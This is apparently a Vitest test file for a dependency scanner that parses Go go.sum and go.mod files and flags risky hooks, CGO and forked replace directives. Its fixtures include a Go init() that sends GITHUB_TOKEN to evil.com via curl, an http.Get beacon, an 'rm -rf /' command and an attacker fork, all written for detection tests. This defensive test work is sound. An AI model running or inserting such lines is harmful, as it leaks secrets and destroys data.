import { describe, it, expect } from "vitest";
import { parseGoSumContent, parseGoModContent, extractGoReplaceForks } from "../src/lockfile/go-parser.js";
import { extractGoHooks } from "../src/analyzer/go-hooks.js";
import { scanPackage } from "../src/analyzer/scanner.js";

// ── go-parser.ts ─────────────────────────────────────────────────────────────

describe("parseGoSumContent", () => {
  const GO_SUM = `
github.com/gorilla/mux v1.8.1 h1:TuBL1KLFESQyB+xpSouqAZFRXb1B5RTKH1FNwnqbCnE=
github.com/gorilla/mux v1.8.1/go.mod h1:DVbg23sWSpFRCP0SfiEN6jmj59UnW/n46BH5rLB71So=
golang.org/x/net v0.38.0 h1:vRMAPTMaeGqVhG5QyLJHqNDwecKTomGeqbnfZyKlBI8=
golang.org/x/net v0.38.0/go.mod h1:iKkCdDl3FTiDt05fR7aABUrU3YPAq3g3LAXPDMsA38=
github.com/pkg/errors v0.9.1 h1:FEBLx1zS214owpjy7qsBeixbURkuhQAwrK5UwLGTwt38=
github.com/pkg/errors v0.9.1/go.mod h1:bwawxfHBFNV+L2hUp1rHADufV3IMtnDRdf1r5NINEl0=
`.trim();

  it("parses module names and versions from go.sum", () => {
    const refs = parseGoSumContent(GO_SUM);
    const names = refs.map((r) => r.name);
    expect(names).toContain("github.com/gorilla/mux");
    expect(names).toContain("golang.org/x/net");
    expect(names).toContain("github.com/pkg/errors");
  });

  it("assigns h1: hash as integrity", () => {
    const refs = parseGoSumContent(GO_SUM);
    const gorilla = refs.find((r) => r.name === "github.com/gorilla/mux");
    expect(gorilla?.integrity).toMatch(/^h1:/);
  });

  it("skips /go.mod entries — only includes zip hashes", () => {
    const refs = parseGoSumContent(GO_SUM);
    // 3 modules → 3 refs (not 6)
    expect(refs).toHaveLength(3);
  });

  it("deduplicates entries", () => {
    const duplicate = `${GO_SUM}\n${GO_SUM}`;
    const refs = parseGoSumContent(duplicate);
    expect(refs).toHaveLength(3);
  });

  it("skips local replace directives from go.mod", () => {
    const modRaw = `
module example.com/myapp

go 1.21

require github.com/gorilla/mux v1.8.1

replace github.com/gorilla/mux => ./local/mux
`;
    const refs = parseGoSumContent(GO_SUM, modRaw);
    const names = refs.map((r) => r.name);
    expect(names).not.toContain("github.com/gorilla/mux");
    expect(names).toContain("golang.org/x/net");
  });

  it("skips retracted versions from go.mod", () => {
    const modRaw = `
module example.com/myapp

go 1.21

require golang.org/x/net v0.38.0

retract v0.38.0
`;
    const refs = parseGoSumContent(GO_SUM, modRaw);
    const names = refs.map((r) => r.name);
    expect(names).not.toContain("golang.org/x/net");
  });

  it("returns empty array for empty go.sum", () => {
    expect(parseGoSumContent("")).toHaveLength(0);
  });

  it("handles modules with capital letters in path", () => {
    const sum = `github.com/BurntSushi/toml v1.3.2 h1:o7IhLm0Msx3BaB+n3Ag7L8EVlByGnpq14C4YWiu/gL8=`;
    const refs = parseGoSumContent(sum);
    expect(refs[0]?.name).toBe("github.com/BurntSushi/toml");
  });
});

// ── parseGoModContent (go.sum-less fallback) ──────────────────────────────────

describe("parseGoModContent", () => {
  const GO_MOD_BLOCK = `module example.com/myapp

go 1.21

require (
\tgithub.com/gorilla/mux v1.8.1
\tgolang.org/x/net v0.38.0 // indirect
\tgithub.com/pkg/errors v0.9.1
)
`;

  it("parses block-form require directives", () => {
    const refs = parseGoModContent(GO_MOD_BLOCK);
    const names = refs.map((r) => r.name);
    expect(names).toContain("github.com/gorilla/mux");
    expect(names).toContain("golang.org/x/net");
    expect(names).toContain("github.com/pkg/errors");
  });

  it("parses single-line require directive", () => {
    const mod = `module example.com/app\ngo 1.21\nrequire github.com/foo/bar v1.2.3\n`;
    const refs = parseGoModContent(mod);
    expect(refs).toHaveLength(1);
    expect(refs[0]?.name).toBe("github.com/foo/bar");
    expect(refs[0]?.version).toBe("v1.2.3");
  });

  it("sets integrity to null (no go.sum available)", () => {
    const refs = parseGoModContent(GO_MOD_BLOCK);
    expect(refs.every((r) => r.integrity === null)).toBe(true);
  });

  it("includes indirect dependencies", () => {
    const refs = parseGoModContent(GO_MOD_BLOCK);
    expect(refs.find((r) => r.name === "golang.org/x/net")).toBeDefined();
  });

  it("skips local replace targets", () => {
    const mod = `module example.com/app\ngo 1.21\nrequire github.com/foo/bar v1.2.3\nreplace github.com/foo/bar => ./local/bar\n`;
    const refs = parseGoModContent(mod);
    expect(refs).toHaveLength(0);
  });

  it("skips retracted versions", () => {
    const mod = `module example.com/app\ngo 1.21\nrequire github.com/foo/bar v1.0.0\nretract v1.0.0\n`;
    const refs = parseGoModContent(mod);
    expect(refs).toHaveLength(0);
  });

  it("deduplicates repeated require entries", () => {
    const mod = `module example.com/app\ngo 1.21\nrequire github.com/foo/bar v1.2.3\nrequire github.com/foo/bar v1.2.3\n`;
    const refs = parseGoModContent(mod);
    expect(refs).toHaveLength(1);
  });

  it("returns empty array for module with no dependencies", () => {
    const mod = `module example.com/app\ngo 1.21\n`;
    expect(parseGoModContent(mod)).toHaveLength(0);
  });
});

// ── go-hooks.ts ───────────────────────────────────────────────────────────────

describe("extractGoHooks — //go:generate", () => {
  it("extracts generate directives", () => {
    const fileMap = new Map([
      ["cmd/main.go", `package main\n\n//go:generate stringer -type=Pill\n\nfunc main() {}`],
    ]);
    const hooks = extractGoHooks(fileMap);
    const keys = Object.keys(hooks);
    expect(keys.some((k) => k.startsWith("go:generate:"))).toBe(true);
    const val = Object.entries(hooks).find(([k]) => k.startsWith("go:generate:"))?.[1];
    expect(val).toBe("stringer -type=Pill");
  });

  it("extracts multiple generate directives from one file", () => {
    const fileMap = new Map([
      ["gen.go", `//go:generate foo\n//go:generate bar\n`],
    ]);
    const hooks = extractGoHooks(fileMap);
    const generateKeys = Object.keys(hooks).filter((k) => k.startsWith("go:generate:"));
    expect(generateKeys).toHaveLength(2);
  });
});

describe("extractGoHooks — CGO", () => {
  it("detects import \"C\" with preamble", () => {
    const cgoFile = `package main

// #include <stdlib.h>
// #cgo LDFLAGS: -lm
import "C"

func main() {}`;
    const fileMap = new Map([["native/lib.go", cgoFile]]);
    const hooks = extractGoHooks(fileMap);
    const keys = Object.keys(hooks);
    expect(keys.some((k) => k.startsWith("cgo:"))).toBe(true);
    const val = Object.values(hooks)[0];
    expect(val).toContain(`import "C"`);
  });

  it("does not flag plain import \"C\" without preamble unexpectedly", () => {
    const fileMap = new Map([["x.go", `package x\nimport "C"\n`]]);
    const hooks = extractGoHooks(fileMap);
    // Should still flag it — import "C" alone is the signal
    const keys = Object.keys(hooks);
    expect(keys.some((k) => k.startsWith("cgo:"))).toBe(true);
  });
});

describe("extractGoHooks — init() functions", () => {
  it("extracts dangerous init() bodies", () => {
    const fileMap = new Map([
      ["exfil.go", `package exfil

import (
  "os/exec"
  "os"
)

func init() {
  token := os.Getenv("GITHUB_TOKEN")
  exec.Command("curl", "-d", token, "https://evil.com").Run()
}`],
    ]);
    const hooks = extractGoHooks(fileMap);
    const keys = Object.keys(hooks);
    expect(keys.some((k) => k.startsWith("init:"))).toBe(true);
  });

  it("does not extract benign init() bodies", () => {
    const fileMap = new Map([
      ["setup.go", `package setup

var registry = map[string]int{}

func init() {
  registry["foo"] = 1
  registry["bar"] = 2
}`],
    ]);
    const hooks = extractGoHooks(fileMap);
    const keys = Object.keys(hooks);
    expect(keys.some((k) => k.startsWith("init:"))).toBe(false);
  });

  it("extracts init() with http.Get call", () => {
    const fileMap = new Map([
      ["beacon.go", `package beacon

import "net/http"

func init() {
  http.Get("https://evil.com/beacon")
}`],
    ]);
    const hooks = extractGoHooks(fileMap);
    const keys = Object.keys(hooks);
    expect(keys.some((k) => k.startsWith("init:"))).toBe(true);
  });
});

// ── pattern matching for .go files ───────────────────────────────────────────

describe("pattern matching — Go source files", () => {
  const emptyFileMap = new Map<string, string>();

  it("go_exec pattern fires on .go source", () => {
    const hooks = { "cmd/main.go": `exec.Command("bash", "-c", "rm -rf /")` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "go_exec")).toBe(true);
  });

  it("go_exec pattern does NOT fire on postinstall script", () => {
    const hooks = { "postinstall": `exec.Command("bash", "-c", "rm -rf /")` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "go_exec")).toBe(false);
  });

  it("go_cgo pattern fires on .go source", () => {
    const hooks = { "native.go": `import "C"` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "go_cgo")).toBe(true);
  });

  it("network pattern does NOT fire on .go source (uses go_network instead)", () => {
    const hooks = { "net.go": `curl https://example.com` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "network")).toBe(false);
  });

  it("go_network pattern fires on .go source for http.Get", () => {
    const hooks = { "beacon.go": `http.Get("https://evil.com")` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "go_network")).toBe(true);
  });
});

// ── go.mod replace fork detection ─────────────────────────────────────────────

describe("extractGoReplaceForks", () => {
  it("extracts remote fork replace directives", () => {
    const mod = `
module example.com/app

require golang.org/x/net v0.38.0

replace golang.org/x/net => github.com/attacker/x-net v0.0.1
`;
    const forks = extractGoReplaceForks(mod);
    expect(forks).toHaveLength(1);
    expect(forks[0]?.original).toBe("golang.org/x/net");
    expect(forks[0]?.fork).toBe("github.com/attacker/x-net");
    expect(forks[0]?.forkVersion).toBe("v0.0.1");
  });

  it("ignores local path replacements", () => {
    const mod = `replace github.com/foo/bar => ./local/bar`;
    expect(extractGoReplaceForks(mod)).toHaveLength(0);
  });

  it("ignores absolute path replacements", () => {
    const mod = `replace github.com/foo/bar => /abs/path/bar v1.0.0`;
    expect(extractGoReplaceForks(mod)).toHaveLength(0);
  });

  it("handles replace with original version pinned", () => {
    const mod = `replace github.com/foo/bar v1.0.0 => github.com/other/bar v2.0.0`;
    const forks = extractGoReplaceForks(mod);
    expect(forks).toHaveLength(1);
    expect(forks[0]?.original).toBe("github.com/foo/bar");
    expect(forks[0]?.fork).toBe("github.com/other/bar");
    expect(forks[0]?.forkVersion).toBe("v2.0.0");
  });

  it("returns empty array when no replace directives", () => {
    const mod = `module example.com/app\nrequire github.com/foo/bar v1.0.0\n`;
    expect(extractGoReplaceForks(mod)).toHaveLength(0);
  });
});

describe("parseGoSumContent — replace fork annotation", () => {
  const MOD_WITH_FORK = `
module example.com/app

require golang.org/x/net v0.38.0

replace golang.org/x/net => github.com/attacker/x-net v0.0.1
`;

  const SUM_WITH_FORK = `
github.com/attacker/x-net v0.0.1 h1:fakeHashForFork=
github.com/attacker/x-net v0.0.1/go.mod h1:fakeModHash=
github.com/gorilla/mux v1.8.1 h1:realHash=
github.com/gorilla/mux v1.8.1/go.mod h1:realModHash=
`.trim();

  it("annotates fork module with replaces field", () => {
    const refs = parseGoSumContent(SUM_WITH_FORK, MOD_WITH_FORK);
    const fork = refs.find((r) => r.name === "github.com/attacker/x-net");
    expect(fork).toBeDefined();
    expect(fork?.replaces).toBe("golang.org/x/net");
  });

  it("does not annotate non-fork modules", () => {
    const refs = parseGoSumContent(SUM_WITH_FORK, MOD_WITH_FORK);
    const gorilla = refs.find((r) => r.name === "github.com/gorilla/mux");
    expect(gorilla?.replaces).toBeUndefined();
  });
});

describe("parseGoModContent — replace fork substitution", () => {
  it("replaces original require with fork and sets replaces field", () => {
    const mod = `
module example.com/app

require golang.org/x/net v0.38.0

replace golang.org/x/net => github.com/attacker/x-net v0.0.1
`;
    const refs = parseGoModContent(mod);
    // Original should not appear
    expect(refs.find((r) => r.name === "golang.org/x/net")).toBeUndefined();
    // Fork should appear with annotation
    const fork = refs.find((r) => r.name === "github.com/attacker/x-net");
    expect(fork).toBeDefined();
    expect(fork?.version).toBe("v0.0.1");
    expect(fork?.replaces).toBe("golang.org/x/net");
  });

  it("leaves non-replaced requires unchanged", () => {
    const mod = `
module example.com/app

require (
  github.com/gorilla/mux v1.8.1
  golang.org/x/net v0.38.0
)

replace golang.org/x/net => github.com/attacker/x-net v0.0.1
`;
    const refs = parseGoModContent(mod);
    const gorilla = refs.find((r) => r.name === "github.com/gorilla/mux");
    expect(gorilla).toBeDefined();
    expect(gorilla?.replaces).toBeUndefined();
  });
});
